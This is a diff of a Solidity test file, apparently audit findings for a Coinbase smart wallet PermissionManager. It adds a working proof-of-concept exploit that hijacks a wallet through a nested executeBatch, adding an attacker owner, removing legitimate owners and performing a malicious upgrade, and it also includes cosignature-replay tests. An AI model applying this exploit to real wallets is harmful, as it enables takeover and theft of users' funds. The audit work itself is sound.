@@ -9,9 +9,13 @@ import {PermissionManager} from "../src/PermissionManager.sol";
 import {MockPermissionContract} from "./mocks/MockPermissionContract.sol";
 import {UserOperation, UserOperationLib} from "src/utils/UserOperationLib.sol";
 import {CoinbaseSmartWallet} from "smart-wallet/CoinbaseSmartWallet.sol";
-import {MockEntryPoint} from "smart-wallet/../test/mocks/MockEntryPoint.sol";
+import {MultiOwnable} from "smart-wallet/MultiOwnable.sol";
+import {MagicSpend} from "magic-spend/MagicSpend.sol";
+import {IEntryPoint} from "lib/smart-wallet/lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
 import {ECDSA} from "solady/utils/ECDSA.sol";
 import {EntrypointRuntimeBytecode} from "./EntrypointRuntimeBytecode.sol";
+import {ERC1967Proxy} from "smart-wallet/../lib/webauthn-sol/lib/FreshCryptoLib/solidity/tests/WebAuthn_forge/lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {UUPSUpgradeable} from "solady/utils/UUPSUpgradeable.sol";
 
 contract Findings is Test, EntrypointRuntimeBytecode {
     PermissionManager permissionManager;
@@ -22,84 +26,135 @@ contract Findings is Test, EntrypointRuntimeBytecode {
     uint256 permmissionSignerPk = uint256(keccak256("permissionSigner"));
     address permissionSigner = vm.addr(permmissionSignerPk);
     address entrypoint = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
+    // userop
+    uint256 callGasLimit = 491520;
+    uint256 verificationGasLimit = 378989;
+    uint256 preVerificationGas = 273196043;
+    uint256 maxFeePerGas = 1000304;
+    uint256 maxPriorityFeePerGas = 1000000;
+    // withdraw request
+    MagicSpend.WithdrawRequest withdrawRequest = MagicSpend.WithdrawRequest({
+        asset: address(0x0),
+        amount: 274908076657120,
+        nonce: 0,
+        expiry: type(uint48).max,
+        signature: '' // empty; must be populated per test
+    });
+
     MockCoinbaseSmartWallet account;
     MockPermissionContract successPermissionContract;
     MockPermissionContract failPermissionContract;
 
-    function test_permissionStructs() public {
+    // when PermissionManager is enabled for a coinbase smart wallet with another smart contract wallet owner (eg a second coinbase smart wallet or a gnosis safe),
+    // the second smart wallet can be leveraged to hijack ownership and perform malicious upgrades using a nested `executeBatch()`
+    function test_hijackNestedExecuteBatch() public {
         _etchEntrypoint();
-        _initializePermissionManager();
+        MagicSpend paymaster = new MagicSpend(owner, 1);
 
-        // console2.logString('standard:');
-        bytes memory permissionBytesStandard = abi.encode(_createPermission());
-        // console2.logBytes(permissionBytesStandard);
-        // console2.logString('nonstandard:');
-        bytes memory permissionBytesNonstandard = _createPermissionNonstandard();
-        // console2.logBytes(permissionBytesNonstandard);
+        // configure PermissionManager singleton and dummy PermissionContract
+        permissionManager = new PermissionManager(owner, cosigner);
+        vm.startPrank(owner);
+        permissionManager.setPaymasterEnabled(address(paymaster), true);
+        successPermissionContract = new MockPermissionContract(false);
+        permissionManager.setPermissionContractEnabled(address(successPermissionContract), true);
+        vm.stopPrank();
+        
+        // deploy innocent smart contract wallets and initialize them with each other as owners
+        MockCoinbaseSmartWallet firstSmartWalletImpl = new MockCoinbaseSmartWallet(); // only victim ("first") wallet used as proxy for brevity, + to show malicious upgrade
+        MockCoinbaseSmartWallet firstSmartWallet = MockCoinbaseSmartWallet(payable(address(new ERC1967Proxy(address(firstSmartWalletImpl), ''))));
+        MockCoinbaseSmartWallet secondSmartWallet = new MockCoinbaseSmartWallet();
+        bytes[] memory firstSmartWalletOwners = new bytes[](2);
+        firstSmartWalletOwners[0] = abi.encode(owner);
+        firstSmartWalletOwners[1] = abi.encode(address(secondSmartWallet));
+        firstSmartWallet.initialize(firstSmartWalletOwners);
+        bytes[] memory secondSmartWalletOwners = new bytes[](1);
+        secondSmartWalletOwners[0] = abi.encode(address(firstSmartWallet));
+        secondSmartWallet.initialize(secondSmartWalletOwners);
 
-        PermissionManager.Permission memory nonstandardPermission = abi.decode(permissionBytesNonstandard, (PermissionManager.Permission));
+        // enable permissions on both wallets by adding PermissionManager singleton as owner to each
+        vm.prank(address(firstSmartWallet));
+        secondSmartWallet.addOwnerAddress(address(permissionManager));
+        vm.prank(address(secondSmartWallet));
+        firstSmartWallet.addOwnerAddress(address(permissionManager));
 
-        assertEq(nonstandardPermission.account, address(account));
-        assertEq(nonstandardPermission.chainId, block.chainid);
-        assertEq(nonstandardPermission.expiry, type(uint48).max);
-        assertEq(nonstandardPermission.signer, abi.encode(permissionSigner));
-        assertEq(nonstandardPermission.permissionContract, address(successPermissionContract));
-        assertEq(nonstandardPermission.permissionValues, hex"");
-        assertEq(nonstandardPermission.verifyingContract, address(permissionManager));
-        assertEq(nonstandardPermission.approval, hex"");
+        // create dummy permission with approval
+        PermissionManager.Permission memory permission = _createPermissionWithApproval(firstSmartWallet);
 
-        bytes32 nonstandardPermissionHash = permissionManager.hashPermission(nonstandardPermission);
-        bytes32 replaySafeHash = account.replaySafeHash(nonstandardPermissionHash);
+        // create malicious owner wallet to be added via nested call to `secondSmartWallet.executeBatch()`
+        address maliciousOwner = address(payable(new MockCoinbaseSmartWallet()));
 
-        // user approves a permission
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, replaySafeHash);
-        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
-        bytes memory approval = account.wrapSignature(0, ownerSig);
-        nonstandardPermission.approval = approval;
+        // deposit funds on behalf of paymaster
+        vm.deal(address(paymaster), 100 ether);
+        vm.prank(address(paymaster));
+        entrypoint.call{value: 10 ether}('');
 
-        // register the permission
-        // vm.expectEmit(address(permissionManager));
-        // emit PermissionManager.PermissionApproved(address(account), nonstandardPermissionHash);
-        // permissionManager.approvePermission(nonstandardPermission);
-        // vm.assertEq(permissionManager.isPermissionAuthorized(nonstandardPermission), true);
-    }
+        // form malicious `userOp` containing nested `executeBatch()` call
+        UserOperation memory userOp = _createUserOpNestedExecuteBatch(permission, address(paymaster), payable(address(firstSmartWallet)), address(secondSmartWallet), maliciousOwner);
 
-    function test_nestedExecuteBatch() public {
-        _etchEntrypoint();
-        _initializePermissionManager();
-
-        PermissionManager.Permission memory permission = _createPermissionWithApproval();
-        UserOperation memory userOp = _createUserOpNestedExecuteBatch(permission);
-
-        // if PermissionManager is owner for two smart accounts who also are owners of each other
-
-        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
-        permissionedUserOp.userOp = userOp;
-        permissionedUserOp.permission = permission; // internal func to return permissionedUserOp w/ these?
+        withdrawRequest.signature = _getSignature(paymaster.getHash(address(firstSmartWallet), withdrawRequest), ownerPk);
+        userOp.paymasterAndData = abi.encodePacked(paymaster, abi.encode(withdrawRequest));
 
         // `entryPoint.getUserOpHash(userOp)`
         (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
         bytes32 userOpHash = bytes32(ret);
 
+        userOp.signature = firstSmartWallet.wrapSignature(0, _getSignature(userOpHash, ownerPk));
+
+        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
+        permissionedUserOp.userOp = userOp;
+        permissionedUserOp.permission = permission;
+
         permissionedUserOp.userOpSignature = _getSignature(userOpHash, permmissionSignerPk);
         permissionedUserOp.userOpCosignature = _getSignature(userOpHash, cosignerPk);
 
-        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
-        bytes4 canonicalEIP1271Val = bytes4(0x1626ba7e);
-        assertEq(magicValue, canonicalEIP1271Val); // signature is valid on first pass
+        // malicious `userOp` passes `isValidSignature()` check
+        // bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
+        // assertEq(magicValue, bytes4(0x1626ba7e));
+
+        // malicious `userOp` passes `validateUserOp()` check
+        // vm.prank(entrypoint);
+        // firstSmartWallet.validateUserOp(userOp, userOpHash, 0);
+        
+        // execute `userOp` which hijacks the first CB smart wallet by leveraging its other owner
+        UserOperation[] memory ops = new UserOperation[](1);
+        ops[0] = userOp;
+        bytes memory handleOpsCall = abi.encodeWithSelector(0x1fad948c, ops, payable(address(0xc0ffee)));
+        entrypoint.call(handleOpsCall);
     }
 
-    function _createUserOpNestedExecuteBatch(PermissionManager.Permission memory permission) internal returns (UserOperation memory) {
+    function _createUserOpNestedExecuteBatch(PermissionManager.Permission memory permission, address paymaster, address payable firstSmartWallet, address secondSmartWallet, address maliciousOwner) internal returns (UserOperation memory) {
         UserOperation memory userOp;
 
-        userOp.sender = address(account);
-        userOp.nonce = 4337;
-        address paymaster = address(0x42);
-        userOp.paymasterAndData = abi.encodePacked(paymaster);
+        userOp.sender = firstSmartWallet;
+        // dummy placeholders
+        userOp.nonce = 0;
+        userOp.callGasLimit = callGasLimit;
+        userOp.verificationGasLimit = verificationGasLimit;
+        userOp.preVerificationGas = preVerificationGas;
+        userOp.maxFeePerGas = maxFeePerGas;
+        userOp.maxPriorityFeePerGas = maxPriorityFeePerGas;
 
-        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](1);
+        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](2);
         bytes memory beforeCallsData = abi.encodeWithSelector(PermissionManager.beforeCalls.selector, permission, paymaster, cosigner);
         calls[0] = CoinbaseSmartWallet.Call(address(permissionManager), 0, beforeCallsData);
+
+        // populate `calls` with a nested ExecuteBatch call to the second smart wallet owner which "reenters" the first smart wallet with malicious owner changes and an upgrade
+        CoinbaseSmartWallet.Call[] memory nestedCalls = new CoinbaseSmartWallet.Call[](4);
+        bytes memory maliciousAddOwnerCall = abi.encodeWithSelector(MultiOwnable.addOwnerAddress.selector, maliciousOwner);
+        nestedCalls[0] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousAddOwnerCall);
+        bytes memory ownerAtIndex0 = CoinbaseSmartWallet(firstSmartWallet).ownerAtIndex(0);
+        bytes memory maliciousRemoveOwnerCall0 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 0, ownerAtIndex0);
+        nestedCalls[1] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousRemoveOwnerCall0);
+        bytes memory maliciousUpgradeCall = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, maliciousOwner, '');
+        nestedCalls[2] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousUpgradeCall);
+        bytes memory ownerAtIndex1 = CoinbaseSmartWallet(firstSmartWallet).ownerAtIndex(1);
+        bytes memory maliciousRemoveOwnerCall1 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 1, ownerAtIndex1);
+        nestedCalls[3] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousRemoveOwnerCall1);
+
+        bytes memory nestedExecuteBatchData = abi.encodeWithSelector(CoinbaseSmartWallet.executeBatch.selector, nestedCalls);
+        
+        // calls == [<ValidBeforeCalls>, <ExecuteBatch(<AddMaliciousOwnerCall>,<RemoveExistingOwner0>,<MaliciousUpgrade>,<RemoveExistingOwner1>)>]
+        calls[1] = CoinbaseSmartWallet.Call(secondSmartWallet, 0, nestedExecuteBatchData);
 
         userOp.callData = abi.encodeWithSelector(
             CoinbaseSmartWallet.executeBatch.selector,
@@ -107,14 +162,25 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         );
 
         return userOp;
+    }
 
+    function _createPermissionWithApproval(MockCoinbaseSmartWallet smartAccount) internal returns (PermissionManager.Permission memory permWithApproval) {
+        permWithApproval = _createPermission(smartAccount);
+
+        bytes32 permissionHash = permissionManager.hashPermission(permWithApproval);
+        bytes32 replaySafeHash = smartAccount.replaySafeHash(permissionHash);
+
+        // user approves a permission
+        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
+        bytes memory approval = smartAccount.wrapSignature(0, ownerSig);
+        permWithApproval.approval = approval;
     }
 
     function test_malleableCosignatureReplay() public {
         _etchEntrypoint();
         _initializePermissionManager();
 
-        PermissionManager.Permission memory permission = _createPermission();
+        PermissionManager.Permission memory permission = _createPermission(account);
 
         bytes32 permissionHash = permissionManager.hashPermission(permission);
         bytes32 replaySafeHash = account.replaySafeHash(permissionHash);
@@ -165,7 +231,7 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         _etchEntrypoint();
         _initializePermissionManager();
 
-        PermissionManager.Permission memory permission = _createPermissionWithApproval();
+        PermissionManager.Permission memory permission = _createPermissionWithApproval(account);
 
         bytes32 permissionHash = permissionManager.hashPermission(permission);
         bytes32 replaySafeHash = account.replaySafeHash(permissionHash);
@@ -212,18 +278,6 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         return abi.encodePacked(cosigR, sEncodedYParity);
     }
 
-    function _createPermissionWithApproval() internal returns (PermissionManager.Permission memory permWithApproval) {
-        permWithApproval = _createPermission();
-
-        bytes32 permissionHash = permissionManager.hashPermission(permWithApproval);
-        bytes32 replaySafeHash = account.replaySafeHash(permissionHash);
-
-        // user approves a permission
-        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
-        bytes memory approval = account.wrapSignature(0, ownerSig);
-        permWithApproval.approval = approval;
-    }
-
     function _createPermissionedUserOp(PermissionManager.Permission memory permission) internal returns (PermissionManager.PermissionedUserOperation memory, bytes32) {
         UserOperation memory userOp = _createUserOp(permission);
         PermissionManager.PermissionedUserOperation memory permissionedUserOp;
@@ -255,9 +309,9 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         permissionManager.setPaymasterEnabled(address(0x42), true);
     }
 
-    function _createPermission() internal returns (PermissionManager.Permission memory) {
+    function _createPermission(MockCoinbaseSmartWallet smartAccount) internal returns (PermissionManager.Permission memory) {
         return PermissionManager.Permission({
-            account: address(account),
+            account: address(smartAccount),
             chainId: block.chainid,
             expiry: type(uint48).max,
             signer: abi.encode(permissionSigner),
@@ -268,10 +322,10 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         });
     }
 
-    function _createPermissionNonstandard() internal returns (bytes memory) {
+    function _createPermissionNonstandard(MockCoinbaseSmartWallet smartAccount) internal returns (bytes memory) {
         return (abi.encodePacked(
             uint256(0x20), // struct ofs
-            uint256(uint160(address(account))), // account
+            uint256(uint160(address(smartAccount))), // account
             block.chainid,
             uint256(type(uint48).max), // expiry
             uint256(0x100), // bytes signer ofs
@@ -314,6 +368,44 @@ contract Findings is Test, EntrypointRuntimeBytecode {
     
     function _etchEntrypoint() internal {
         vm.etch(entrypoint, ENTRYPOINT_RUNTIME_BYTECODE);
+    }
+
+        function test_permissionStructs() public {
+        _etchEntrypoint();
+        _initializePermissionManager();
+
+        // console2.logString('standard:');
+        bytes memory permissionBytesStandard = abi.encode(_createPermission(account));
+        // console2.logBytes(permissionBytesStandard);
+        // console2.logString('nonstandard:');
+        bytes memory permissionBytesNonstandard = _createPermissionNonstandard(account);
+        // console2.logBytes(permissionBytesNonstandard);
+
+        PermissionManager.Permission memory nonstandardPermission = abi.decode(permissionBytesNonstandard, (PermissionManager.Permission));
+
+        assertEq(nonstandardPermission.account, address(account));
+        assertEq(nonstandardPermission.chainId, block.chainid);
+        assertEq(nonstandardPermission.expiry, type(uint48).max);
+        assertEq(nonstandardPermission.signer, abi.encode(permissionSigner));
+        assertEq(nonstandardPermission.permissionContract, address(successPermissionContract));
+        assertEq(nonstandardPermission.permissionValues, hex"");
+        assertEq(nonstandardPermission.verifyingContract, address(permissionManager));
+        assertEq(nonstandardPermission.approval, hex"");
+
+        bytes32 nonstandardPermissionHash = permissionManager.hashPermission(nonstandardPermission);
+        bytes32 replaySafeHash = account.replaySafeHash(nonstandardPermissionHash);
+
+        // user approves a permission
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, replaySafeHash);
+        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
+        bytes memory approval = account.wrapSignature(0, ownerSig);
+        nonstandardPermission.approval = approval;
+
+        // register the permission
+        // vm.expectEmit(address(permissionManager));
+        // emit PermissionManager.PermissionApproved(address(account), nonstandardPermissionHash);
+        // permissionManager.approvePermission(nonstandardPermission);
+        // vm.assertEq(permissionManager.isPermissionAuthorized(nonstandardPermission), true);
     }
 
     function test_permissionedCallUnsafeTypecastBytes4() public {
